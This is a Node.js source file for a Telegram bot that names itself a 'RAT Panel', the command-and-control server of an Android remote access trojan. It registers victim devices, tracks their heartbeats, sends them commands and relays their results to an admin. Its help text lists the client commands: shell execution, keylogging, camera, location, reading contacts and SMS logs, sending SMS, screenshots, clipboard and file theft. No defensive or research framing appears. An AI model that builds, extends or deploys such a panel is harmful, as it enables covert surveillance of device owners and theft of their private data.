const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const TOKEN = '123456789:ABCdefGHIjklMNOpqrsTUVwxyz';
const ADMIN_ID = 123456789; // Telegram ID admin

const bot = new TelegramBot(TOKEN, { polling: true });

// store clients: userId -> { chatId, info, status }
const clients = new Map();

// ─── HELP ──────────────────────────────────

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
🔹 RAT Panel — Telegram Bot

📱 /clients — lihat semua client online/offline
📋 /info [user_id] — info detail client
📤 /cmd [user_id] [command] — kirim command ke client
📊 /status — status server

Command list buat client:
sms:0812:pesan
loc
cam
shell:ls /sdcard
list:/sdcard
contacts
smslog
keylog_on
keylog_off
download:/path/file
screenshot
clipboard
`);
});

// ─── CLIENTS LIST ──────────────────────────

bot.onText(/\/clients/, (msg) => {
    const chatId = msg.chat.id;
    if (clients.size === 0) {
        return bot.sendMessage(chatId, '📭 No clients registered.');
    }

    let text = '📱 Clients:\n\n';
    clients.forEach((data, userId) => {
        const status = data.status || 'offline';
        const icon = status === 'online' ? '🟢' : '🔴';
        text += `${icon} ${userId} — ${data.device || 'unknown'} (${status})\n`;
    });
    bot.sendMessage(chatId, text);
});

// ─── CLIENT INFO ───────────────────────────

bot.onText(/\/info (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1].trim();

    if (!clients.has(userId)) {
        return bot.sendMessage(chatId, `❌ Client ${userId} not found.`);
    }

    const data = clients.get(userId);
    bot.sendMessage(chatId, `
📋 Client Info:
ID: ${userId}
Device: ${data.device || 'unknown'}
Android: ${data.android || 'unknown'}
Status: ${data.status || 'offline'}
Last seen: ${data.lastSeen || 'never'}
Registered: ${data.registeredAt}
`);
});

// ─── SEND COMMAND ──────────────────────────

bot.onText(/\/cmd (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const parts = match[1].split(' ');
    const targetUserId = parts[0];
    const command = parts.slice(1).join(' ');

    if (!command) {
        return bot.sendMessage(chatId, '❌ Usage: /cmd [user_id] [command]');
    }

    if (!clients.has(targetUserId)) {
        return bot.sendMessage(chatId, `❌ Client ${targetUserId} not found.`);
    }

    // forward command ke client via Telegram
    bot.sendMessage(targetUserId, `CMD:${command}`);
    clients.get(targetUserId).status = 'online';
    bot.sendMessage(chatId, `✅ Command sent to ${targetUserId}: ${command}`);
});

// ─── STATUS ────────────────────────────────

bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id;
    const online = Array.from(clients.values()).filter(c => c.status === 'online').length;
    bot.sendMessage(chatId, `
📊 Server Status:
Bot online ✅
Total clients: ${clients.size}
Online: ${online}
Offline: ${clients.size - online}
`);
});

// ─── CLIENT REGISTRATION ───────────────────

bot.onText(/\/register (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id; // client's telegram ID
    const deviceInfo = match[1].trim();

    clients.set(userId, {
        chatId: chatId,
        device: deviceInfo,
        status: 'online',
        registeredAt: new Date().toISOString(),
        lastSeen: new Date().toISOString()
    });

    // notify admin
    bot.sendMessage(ADMIN_ID, `✅ New client registered: ${userId} (${deviceInfo})`);
    bot.sendMessage(chatId, '✅ Registered! You can now receive commands.');
});

// ─── CLIENT HEARTBEAT ──────────────────────

// client kirim /ping setiap 30 detik
bot.onText(/\/ping/, (msg) => {
    const userId = msg.from.id;
    if (clients.has(userId)) {
        const data = clients.get(userId);
        data.status = 'online';
        data.lastSeen = new Date().toISOString();
        clients.set(userId, data);
    }
});

// ─── CLIENT RESPONSE ───────────────────────

// client kirim hasil command via /response
bot.onText(/\/response (.+)/, (msg, match) => {
    const userId = msg.from.id;
    const response = match[1].trim();

    // forward ke admin
    bot.sendMessage(ADMIN_ID, `📥 From ${userId}:\n${response}`);
});

// ─── ADMIN BROADCAST ───────────────────────

bot.onText(/\/broadcast (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only.');
    }

    const message = match[1].trim();
    clients.forEach((data, userId) => {
        bot.sendMessage(userId, `📢 Broadcast: ${message}`);
    });
    bot.sendMessage(chatId, `✅ Broadcast sent to ${clients.size} clients.`);
});

// ─── ADMIN KICK ────────────────────────────

bot.onText(/\/kick (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (msg.from.id !== ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Admin only.');
    }

    const userId = match[1].trim();
    if (clients.has(userId)) {
        clients.delete(userId);
        bot.sendMessage(userId, '❌ You have been kicked.');
        bot.sendMessage(chatId, `✅ Client ${userId} kicked.`);
    } else {
        bot.sendMessage(chatId, `❌ Client ${userId} not found.`);
    }
});

console.log('🔹 RAT Panel running...');